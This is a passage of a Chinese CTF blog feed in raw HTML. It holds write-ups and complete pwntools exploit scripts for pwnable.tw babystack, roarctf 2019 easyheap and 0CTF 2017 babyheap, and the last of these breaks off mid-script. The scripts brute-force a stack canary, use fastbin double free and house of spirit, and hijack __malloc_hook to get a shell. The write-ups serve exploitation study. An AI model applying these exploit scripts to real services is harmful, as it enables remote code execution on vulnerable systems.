class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = ['tmux','split','-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process("./babystack")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10205</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">libc = ELF(<span class="string">"libc_64.so.6"</span>)</span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    se(<span class="string">"1"</span>)</span><br><span class="line">    s(<span class="string">"passowrd :"</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    s(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(cnt)</span>:</span></span><br><span class="line">    s(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">    s(<span class="string">"Copy :"</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(length,s1 = <span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s2 = s1 + chr(i)</span><br><span class="line">            login(s2+<span class="string">'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">                s1 = s2</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]found!"</span></span><br><span class="line">                logout()</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(s2) == length:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length,s1 = <span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s2 = s1 + chr(i)</span><br><span class="line">            login(<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'1'</span>+<span class="string">'a'</span>*<span class="number">0x7</span>+s2+<span class="string">'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">                s1 = s2</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]found!"</span></span><br><span class="line">                logout()</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(s2) == length:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line">magic = bf(<span class="number">16</span>)</span><br><span class="line">login(<span class="string">'\x00'</span>+<span class="string">'a'</span>*<span class="number">0x57</span>)</span><br><span class="line">copy(<span class="string">"b"</span>*<span class="number">0x20</span>)</span><br><span class="line">logout()</span><br><span class="line">base = leak(<span class="number">6</span>)</span><br><span class="line">libc_base = u64(base.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x6ffb4</span></span><br><span class="line">one = <span class="number">0xf0567</span> + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">login(<span class="string">'\x00'</span>+<span class="string">'c'</span>*<span class="number">0x3f</span>+magic+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(one))</span><br><span class="line">copy(<span class="string">"b"</span>*<span class="number">0x20</span>)</span><br><span class="line">se(<span class="string">"2"</span>)</span><br><span class="line"><span class="comment">#find /home -name flag | xargs cat</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img alt="" data-src="/2020/06/22/pwnable-tw-babystack/1.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>buuoj刷题记录之堆</title>
      <link href="/2020/06/09/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8B%E5%A0%86/"/>
      <url>/2020/06/09/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8B%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<h3 id="roarctf-2019-easyheap"><a href="#roarctf-2019-easyheap" class="headerlink" title="roarctf 2019 easyheap"></a>roarctf 2019 easyheap</h3><p>这道题涉及的利用的技巧主要是house of spirit和文件描述符重定向</p><h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h4><p>hos利用场景是<code>可写区域-不可写区域-可写区域</code>，这时可以利用堆中的漏洞进行hos而使中间的不可写区域变得可写。方法是通过伪造堆块使其加入bins中</p><h4 id="文件描述符重定向"><a href="#文件描述符重定向" class="headerlink" title="文件描述符重定向"></a>文件描述符重定向</h4><p>题目在后半部分关闭stdout和stderr，具体参考<a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a></p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>除了PIE，其他保护全开。功能如下：</p><ol><li>add：可以malloc申请不超过0x80的堆块</li><li>dele：free之后未清零，可以造成double free</li><li>show：需要中间<code>不可写区域</code>为特定值，使用后关闭stdout和stderr</li><li>secret：当功能号为666时，可以使用。可以calloc(0xA0)和free，也是没有清零。可以多次使用</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_602010 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"everything has a price"</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7; <span class="comment">//仍然减少</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"build or free?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;v2, <span class="number">8u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v0 = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v2, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">calloc</span>(<span class="number">0xA0</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please input your content"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, ptr, <span class="number">0xA0</span>uLL) &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invaild choice"</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">  --qword_602010; <span class="comment">//当减至小于0时仍可使用</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是输入name和info，即两处可写区域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602060 unk_602060     #name,大小0x20</span><br><span class="line">.bss:0000000000602088 buf          </span><br><span class="line">.bss:0000000000602090 qword_602090   #需要为0xdeadbeefdeadbeef才能show                   </span><br><span class="line">.bss:0000000000602098 ; void *ptr</span><br><span class="line">.bss:00000000006020A0 unk_6020A0     #info，大小0x20</span><br></pre></td></tr></table></figure><p>思路如下：</p><p>在name和info处伪造好堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">sl(<span class="string">"name:"</span>,pay)</span><br><span class="line">sl(<span class="string">"info"</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))</span><br></pre></td></tr></table></figure><p>利用double free造成fastbin attack将bss加入fastbinzhong</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">dele()</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">'exit'</span>])+p64(<span class="number">0xdeadbeefdeadbeef</span>))</span><br></pre></td></tr></table></figure><p>泄露libc，因为got表不可写，因此需要再次利用fastbin attack劫持malloc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dele2()</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">dele2()</span><br><span class="line">add2(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc+<span class="number">0x14</span>))</span><br></pre></td></tr></table></figure><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./roarctf_2019_easyheap"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",28917)</span></span><br><span class="line">elf = ELF(<span class="string">"./roarctf_2019_easyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,cnt)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"size"</span>,str(size))</span><br><span class="line">    s(<span class="string">"content"</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,cnt)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.sendline(cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele2</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(i)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"666"</span>)</span><br><span class="line">    sl(<span class="string">"?"</span>,str(i))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        sl(<span class="string">"content"</span>,<span class="string">"kangel"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">sl(<span class="string">"name:"</span>,pay)</span><br><span class="line">sl(<span class="string">"info"</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))</span><br><span class="line"><span class="comment"># add(0x40,'aaa')</span></span><br><span class="line">secret(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">dele()</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">'exit'</span>])+p64(<span class="number">0xdeadbeefdeadbeef</span>))</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'exit'</span>]</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>] + libc_base</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>] + libc_base</span><br><span class="line">one = libc_base +<span class="number">0xf1147</span><span class="comment"># 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">dele2()</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">dele2()</span><br><span class="line">add2(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc+<span class="number">0x14</span>))</span><br><span class="line"><span class="comment"># gd()</span></span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'exec 1&gt;&amp;0'</span>) <span class="comment">#将stdout重定向到stdin，即终端</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0CTF-2017-babyheap"><a href="#0CTF-2017-babyheap" class="headerlink" title="0CTF 2017 babyheap"></a>0CTF 2017 babyheap</h3><p>edit处存在堆溢出，因此可以overlapping打fastbin attack。add使用的是calloc，可以改写ismmap标志位从而泄露libc</p><h4 id="mmap的calloc分配不会memset"><a href="#mmap的calloc分配不会memset" class="headerlink" title="mmap的calloc分配不会memset"></a>mmap的calloc分配不会memset</h4><p>具体方法如下：</p><ol><li>申请largebin大小(0x500)的堆块并free，这时进入unsorted bin。</li><li>利用堆溢出是<code>ismmap = 1</code></li><li>申请更大(0x600)的堆块，unsorted bin中的堆块进入largebin</li><li>重新calloc申请(0x500)，不会memset</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x600</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x70</span>,<span class="number">0x68</span>*<span class="string">'b'</span>+p64(<span class="number">0x513</span>))</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#7</span></span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>之后是常规的overlapping打fastbin attack，然后劫持malloc_hook。</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",29087)</span></span><br><span class="line">elf = ELF(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"Size:"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,cnt)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">    sl(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">    s(<span class="string">"Content:"</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"Command:"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sl(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">3</span>,<span class="string">"123"</span>)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x600</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span 